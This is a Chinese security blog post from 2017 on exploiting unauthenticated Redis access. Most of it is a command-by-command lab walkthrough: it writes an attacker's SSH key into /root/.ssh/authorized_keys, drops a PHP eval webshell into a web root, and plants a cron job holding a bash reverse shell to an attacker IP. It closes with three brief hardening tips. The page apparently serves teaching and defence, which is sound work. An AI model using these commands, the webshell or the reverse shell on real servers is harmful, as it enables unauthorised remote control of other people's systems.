<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 配置漏洞之redis未授权访问 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="配置漏洞之redis未授权访问 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">配置漏洞之redis未授权访问</h1><div class="post-time">Jul 12, 2017</div><div class="post-content"><!-- ttoc -->
<h2><span id="huan-jing-an-zhuang">环境安装</span><a href="#huan-jing-an-zhuang" class="header-anchor">#</a></h2><h3><span id="xia-zai-yuan-ma">下载源码</span><a href="#xia-zai-yuan-ma" class="header-anchor">#</a></h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.3.tar.gz</span><br><span class="line">$ cd redis-2.8.3</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
<h3><span id="bian-yi-wan-cheng-hou">编译完成后</span><a href="#bian-yi-wan-cheng-hou" class="header-anchor">#</a></h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/redis</span><br><span class="line">cp redis-server  /usr/redis</span><br><span class="line">cp redis-benchmark /usr/redis</span><br><span class="line">cp redis-cli  /usr/redis</span><br><span class="line">cp redis.conf  /usr/redis</span><br><span class="line">cd /usr/redis</span><br></pre></td></tr></table></figure>
<h3><span id="qi-dong-redis-fu-wu">启动redis服务</span><a href="#qi-dong-redis-fu-wu" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server ./redis.conf</span><br></pre></td></tr></table></figure>
<h3><span id="cha-kan-redis-shi-fou-kai-qi">查看redis是否开启</span><a href="#cha-kan-redis-shi-fou-kai-qi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp | grep redis</span><br></pre></td></tr></table></figure>
<h2><span id="lou-dong-li-yong">漏洞利用</span><a href="#lou-dong-li-yong" class="header-anchor">#</a></h2><ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<h3><span id="li-yong-nmap-huo-qu-redis-xin-xi">利用nmap获取redis信息</span><a href="#li-yong-nmap-huo-qu-redis-xin-xi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis1.jpg" alt=""></p>
<h3><span id="li-yong-redis-ke-hu-duan-jin-xing-wei-shou-quan-fang-wen">利用redis客户端进行未授权访问</span><a href="#li-yong-redis-ke-hu-duan-jin-xing-wei-shou-quan-fang-wen" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134</span><br><span class="line">192.168.132.134:6379&gt; info</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis2.jpg" alt=""></p>
<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134 –a [password]</span><br></pre></td></tr></table></figure></p>
<h3><span id="li-yong-redis-lian-jie-xie-ru-ssh-gong-yao">利用redis连接写入ssh公钥</span><a href="#li-yong-redis-lian-jie-xie-ru-ssh-gong-yao" class="header-anchor">#</a></h3><h4><span id="zai-gong-ji-ji-shang-sheng-cheng-ssh-gong-yao-he-si-yao">在攻击机上生成ssh公钥和私钥</span><a href="#zai-gong-ji-ji-shang-sheng-cheng-ssh-gong-yao-he-si-yao" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis3.jpg" alt=""></p>
<h4><span id="jiang-gong-yao-xie-ru-wen-ben">将公钥写入文本</span><a href="#jiang-gong-yao-xie-ru-wen-ben" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</span><br></pre></td></tr></table></figure>
<h4><span id="jiang-1-txt-xie-ru-redis">将1.txt写入redis</span><a href="#jiang-1-txt-xie-ru-redis" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</span><br></pre></td></tr></table></figure>
<h4><span id="li-yong-redis-ke-hu-duan-lian-jie-ba-ji-redis">利用redis客户端连接靶机redis</span><a href="#li-yong-redis-ke-hu-duan-lian-jie-ba-ji-redis" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134</span><br></pre></td></tr></table></figure>
<h4><span id="huo-qu-redis-bei-fen-de-lu-jing">获取redis备份的路径</span><a href="#huo-qu-redis-bei-fen-de-lu-jing" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG GET dir</span><br></pre></td></tr></table></figure>
<h4><span id="geng-gai-redis-bei-fen-lu-jing">更改redis备份路径</span><a href="#geng-gai-redis-bei-fen-lu-jing" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</span><br></pre></td></tr></table></figure>
<h4><span id="she-zhi-bei-fen-wen-jian-de-ming-cheng-wei-authorized-keys">设置备份文件的名称为authorized_keys</span><a href="#she-zhi-bei-fen-wen-jian-de-ming-cheng-wei-authorized-keys" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
<h4><span id="jian-cha-shi-fou-geng-gai">检查是否更改</span><a href="#jian-cha-shi-fou-geng-gai" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</span><br></pre></td></tr></table></figure>
<h4><span id="bao-cun">保存</span><a href="#bao-cun" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; save</span><br></pre></td></tr></table></figure>
<h4><span id="ssh-lian-jie">ssh连接</span><a href="#ssh-lian-jie" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh –i  id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure>
<h3><span id="li-yong-redis-xie-ru-shell">利用redis写入Shell</span><a href="#li-yong-redis-xie-ru-shell" class="header-anchor">#</a></h3><h4><span id="cha-kan-shi-fou-cun-zai-web-fu-wu">查看是否存在web服务</span><a href="#cha-kan-shi-fou-cun-zai-web-fu-wu" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.111</span><br></pre></td></tr></table></figure>
<h4><span id="que-ding-web-fu-wu-mu-lu">确定web服务目录</span><a href="#que-ding-web-fu-wu-mu-lu" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /usr/local/apache/htdocs/</span><br><span class="line">config set dbfilename ok.php </span><br><span class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h4><span id="cai-dao-lian-jie-yi-ju-hua-mu-ma">菜刀连接一句话木马</span><a href="#cai-dao-lian-jie-yi-ju-hua-mu-ma" class="header-anchor">#</a></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis-cli0.png" alt=""></p>
<h3><span id="xie-ji-hua-ren-wu-lai-fan-dan-shell">写计划任务来反弹shell</span><a href="#xie-ji-hua-ren-wu-lai-fan-dan-shell" class="header-anchor">#</a></h3><h4><span id="telnet-deng-lu-ye-ke-yi-redis-cli-deng-lu">telnet登录/也可以redis-cli登录</span><a href="#telnet-deng-lu-ye-ke-yi-redis-cli-deng-lu" class="header-anchor">#</a></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis-cli1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.236.130 6379 //未授权登录</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line"></span><br><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</span><br></pre></td></tr></table></figure>
<h4><span id="nc-fan-dan">nc反弹</span><a href="#nc-fan-dan" class="header-anchor">#</a></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/redis-cli2.png" alt=""></p>
<h2><span id="lou-dong-xiu-fu">漏洞修复</span><a href="#lou-dong-xiu-fu" class="header-anchor">#</a></h2><ul>
<li>禁止使用 root 权限启动 redis 服务；</li>
<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
<li>尽可能不对公网直接开放 SSH 服务。</li>
</ul>
</div></article></div></section><footer><div class="paginator"><a href="/posts/skill/Meatsploit-Framework-利用总结.html" class="prev">PREV</a><a href="/posts/skill/配置漏洞之DNS域传送信息泄露.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>